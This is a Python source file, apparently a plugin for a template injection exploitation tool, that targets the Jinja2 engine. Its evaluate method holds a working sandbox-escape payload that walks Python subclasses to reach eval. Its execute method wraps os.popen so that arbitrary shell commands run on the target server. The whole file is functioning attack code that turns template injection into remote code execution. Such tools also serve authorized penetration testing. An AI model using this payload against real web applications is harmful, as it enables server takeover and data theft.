from core.check import Check
from utils.loggers import log
from utils import rand
from utils.strings import quote

class Jinja2(Check):

    render_tag = '{{%(payload)s}}'
    header_tag = '{{%(header)s}}'
    trailer_tag = '{{%(trailer)s}}'
    contexts = [
        { 'level': 1, 'prefix': '""}}', 'suffix' : '{{""' },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '{{"%s".join("%s")}}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.inject(payload):
            self.set('language', 'python')
            self.set('engine', 'jinja2')
            self.set('eval', 'python')

    def detect_eval(self):

        payload = """"-".join([__import__("os").name, __import__("sys").platform])"""
        self.set('os', self.evaluate(payload))
        self.set('eval', 'python')

    def evaluate(self, code):
        return self.inject("""{%% set d = "%s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
{%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
{%% if 'eval' in b.keys() %%}
{{ b['eval'](d) }}
{%% endif %%} {%% endif %%} {%% endfor %%}
{%% endif %%} {%% endfor %%}"""  % (quote(code)))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        execution_code = '__import__("os").popen("%s").read()' % quote(command)
        return self.evaluate(execution_code)
